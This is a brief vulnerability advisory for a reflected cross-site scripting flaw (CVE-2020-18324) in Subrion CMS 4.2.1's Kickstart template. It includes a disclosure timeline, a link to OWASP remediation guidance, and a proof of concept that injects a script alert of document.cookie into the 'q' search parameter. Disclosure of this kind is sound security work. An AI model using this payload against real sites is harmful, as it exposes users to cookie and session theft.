
# Subrion CMS 4.2.1 – Reflected XSS vulnerability in Kickstart template 
# Description
Subrion CMS is easy to install and simple to manage. Use it as a stand-alone application or in conjunction with other applications to create entry level sites, mid-sized or large sites.

The Reflected Cross-site Scripting vulnerability was discovered in the "Kickstart" web application template of the Subrion CMS v.4.2.1 via the "search" component, which allows a remote attacker to inject arbitrary JavaScript.

**Date**: 22-02-2022 \
**Software Link:** https://subrion.org \
**Exploit Author**: HaMM0nz \
**CVE**: CVE-2020-18324 \
**Category:** Web Application

# Proof of Concept
1. Navigate to Subrion Kickstart template
2. Inject <script>alert(document.cookie);</script> into “q” parameter, in PoC exploit will be https://localhost/search/?q=<script>alert(document.cookie);</script>

# Timeline
**Discovery and report** : 24 June 2019 \
**CVE ID was assigned** : 11 Aug 2021 \
**Public** : 22 February 2022
# Solution
Consider complying to the OWASP's XSS prevention guidelines. (https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
